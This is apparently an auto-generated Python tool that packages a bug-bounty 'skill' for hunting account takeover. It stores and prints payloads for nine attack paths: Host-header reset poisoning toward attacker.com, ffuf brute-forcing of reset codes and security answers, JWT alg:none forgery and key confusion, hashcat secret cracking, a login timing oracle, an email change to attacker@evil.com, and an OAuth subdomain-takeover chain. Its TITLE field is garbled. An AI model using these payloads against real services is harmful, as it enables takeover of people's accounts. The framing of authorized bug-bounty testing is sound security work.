#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: claude-bughunter/hunt-ato

Skill: OR keep real Host and add one of:
Desc : Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (forge token to another identity; crypto details → hunt-jwt-crypto), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session; OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical.

Run:  python claude-bughunter-hunt-ato.py --help
      python claude-bughunter-hunt-ato.py --list
      python claude-bughunter-hunt-ato.py --dump <section>
"""
import sys, json, argparse

NAME = 'claude-bughunter/hunt-ato'
TITLE = 'OR keep real Host and add one of:'
DESCRIPTION = "Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (forge token to another identity; crypto details → hunt-jwt-crypto), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session; OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical."

PAYLOADS = {
    'main': ["name: hunt-ato", "description: \"Hunt account takeover taxonomy \u2014 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host-header injection redirects token, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session fixation, (6) JWT manipulation (forge token to another identity; crypto details \u2192 hunt-jwt-crypto), (7) password change without step-up (chain with login timing/length oracle), (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + password oracle + no step-up = persistent ATO; lax redirect_uri = auth-code theft; dangling-CNAME takeover at redirect_uri = ATO. Validate: demonstrate real takeover of test account B from attacker A's session; OOB/Collaborator confirm blind token-leak steps. Use when hunting ATO chains, testing password reset / email change / MFA / OAuth / session / JWT, or chaining primitives toward Critical.\""],
    '13-ato-account-takeover-taxonomy': [],
    'path-1-password-reset-poisoning-host-header': ["```bash", "POST /forgot-password HTTP/1.1", "Host: attacker.com                 # primary Host swap"],
    'or-keep-real-host-and-add-one-of': ["X-Forwarded-Host: attacker.com", "X-Host: attacker.com", "X-Forwarded-Server: attacker.com"],
    'or-dual-host-smuggling-host-target-com-r-nhost-attacker-com': ["email=victimB@company.com", "The reset mailer builds the link from the request Host header \u2192 link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.", "**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned \u2014 read the email, do not infer from the reflected header."],
    'path-2-reset-token-in-referer-open-redirect-leak': ["GET /reset-password?token=ABC123", "\u2192 page loads third-party resource: <script src=\"https://analytics.com/t.js\">", "\u2192 browser sends  Referer: https://target.com/reset-password?token=ABC123", "\u2192 token exfiltrated to every off-origin host the page calls", "Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body \u2014 note their absence."],
    'path-3-predictable-weak-reset-tokens': ["```bash"],
    '6-digit-numeric-otp-style-reset-code-no-rate-limit': ["ffuf -u \"https://target.com/api/reset/verify\" -X POST \\", "-H \"Content-Type: application/json\" \\", "-d '{\"email\":\"victimB@company.com\",\"code\":\"FUZZ\"}' \\", "-w <(seq -w 000000 999999) -mc 200 -fr \"invalid\" -t 5"],
    'time-based-tokens-capture-5-tokens-diff-md5-timestamp-sequential-int-predictable': ["**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected \u2014 the impact is token guessing, not request flooding."],
    'path-4-token-no-expiry-reuse-cross-account': ["Expiry:  request token \u2192 wait 2h \u2192 still valid? = bug", "Reuse:   use token once \u2192 use again \u2192 still valid? = bug", "Multi:   request token#1, then token#2 \u2192 is token#1 still valid? (should be invalidated)", "Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset"],
    'path-5-email-change-without-re-auth': ["```bash", "PUT /api/user/email HTTP/1.1", "Cookie: session=ATTACKER_A_SESSION", "{\"new_email\":\"attacker@evil.com\"}     # no current_password, no OTP, no email-confirm", "If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset \u2192 reset lands at attacker mailbox \u2192 ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change \u2192 ATO via missing re-auth."],
    'path-6-jwt-manipulation': ["```bash"],
    'a-alg-none-strip-the-signature-set-header-alg-to-none': ["python3 -c \"import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))\""],
    'send-header-alg-none-typ-jwt-payload-sub-victimb-empty-signature': [],
    'b-rs256-hs256-key-confusion-re-sign-with-the-server-s-public-key-as-the-hmac-secret': ["curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key"],
    'convert-jwk-pem-then-sign-hs256-using-that-pem-bytes-as-the-secret-server-verifies-it': [],
    'c-weak-hmac-secret-crack-offline': ["hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT"],
    'd-kid-injection-kid-dev-null-empty-key-or-kid-union-select-secret-sql-backed-kid': ["**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 \u2014 alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256\u2192HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) \u2014 decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary \u2014 no finding."],
    'path-7-password-change-without-step-up-login-oracle': ["```bash"],
    'a-password-change-endpoint-accepts-a-new-password-with-no-current-password-no-mfa-challenge': ["POST /api/account/password", "Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak", "{\"new_password\":\"Pwned#2026\"}          # no \"current_password\" field"],
    'b-login-oracle-to-find-a-valid-password-without-an-existing-cookie-measure-response-delta': ["for p in $(cat candidates.txt); do", "t=$(curl -s -o /dev/null -w '%{time_total}' -d \"user=victimB&pass=$p\" https://target.com/login)", "printf '%s\\t%s\\n' \"$t\" \"$p\"", "done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass", "A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie \u2192 owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate \u2014 many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser)."],
    'path-8-social-recovery-security-question-abuse': ["```bash"],
    'security-answers-are-low-entropy-and-often-unthrottled-brute-the-recovery-answer-endpoint': ["ffuf -u \"https://target.com/account/recover/answer\" -X POST \\", "-H \"Content-Type: application/json\" \\", "-d '{\"email\":\"victimB@company.com\",\"question\":\"pet\",\"answer\":\"FUZZ\"}' \\", "-w common-answers.txt -mc 200 -fr \"incorrect\" -t 5"],
    'also-test-answers-returned-echoed-in-api-me-or-recovery-page-source-client-side-check': [],
    'and-question-itself-reveals-pii-the-answer-to-which-is-osint-able-mother-maiden-first-school': ["Pair with `offensive-osint`: many \"secret\" answers (birth city, pet, school) are public on social profiles \u2192 no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B."],
    'path-9-sso-subdomain-takeover-at-oauth-redirect-uri': ["```bash"],
    'a-enumerate-accepted-redirect-uri-patterns-does-the-provider-accept-target-com-subdomains': ["GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code"],
    'b-find-a-dangling-subdomain-cname-deprovisioned-heroku-s3-azure-gh-pages-via-hunt-subdomain': ["dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)"],
    'c-claim-that-host-on-the-cloud-provider-serve-a-callback-that-logs-the-code': [],
    'd-send-victim-b-the-crafted-authorize-url-their-code-token-lands-on-your-claimed-subdomain': ["**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed \u2014 log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring \u2014 `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token."],
    'ato-severity-gate': ["- **Critical** \u2014 zero/low victim interaction: Host-header reset poisoning, JWT forgery to victim endpoint, lax-redirect_uri auth-code theft, IDOR-driven email change \u2192 reset.", "- **High** \u2014 one email click OR a pre-existing session/cookie required (Referer leak, no-step-up password change behind cookie theft).", "- **Medium** \u2014 requires phishing + active user interaction (OAuth-link CSRF needing the victim to click + be logged in).", "- **Low** \u2014 attacker must be MitM, or only self-account impact."],
    'related-skills-chains': ["- **`hunt-idor`** \u2014 The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{\"email\":\"attacker@evil.com\"}` \u2192 trigger password reset \u2192 reset email arrives at attacker \u2192 full ATO, zero victim interaction (Path 5 + IDOR = Critical).", "- **`hunt-mfa-bypass`** \u2014 Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up \u2192 cookie theft (XSS / token leak) + login timing oracle \u2192 set new password from the stolen cookie \u2192 MFA-less ATO from any IP/device.", "- **`hunt-oauth`** \u2014 Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` \u2192 claim it on Heroku/S3 \u2192 host an OAuth callback \u2192 victim clicks the crafted authorize URL \u2192 code lands on the attacker subdomain \u2192 exchange for token \u2192 ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.", "- **`hunt-api-misconfig`** \u2014 Path 6 (JWT) detail lives here too: alg:none, RS256\u2192HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK\u2192PEM conversion mechanics.", "- **`hunt-host-header`** \u2014 Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` \u2192 mailer builds the link from the request Host \u2192 link points to `attacker.com/reset?token=XXXX` \u2192 victim clicks \u2192 token leaked \u2192 ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.", "- **`offensive-osint`** \u2014 Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles \u2192 recover account B with no brute force at all.", "- **`security-arsenal`** \u2014 Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for \"rate-limit on /forgot-password\" reports.", "- **`triage-validation`** \u2014 Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()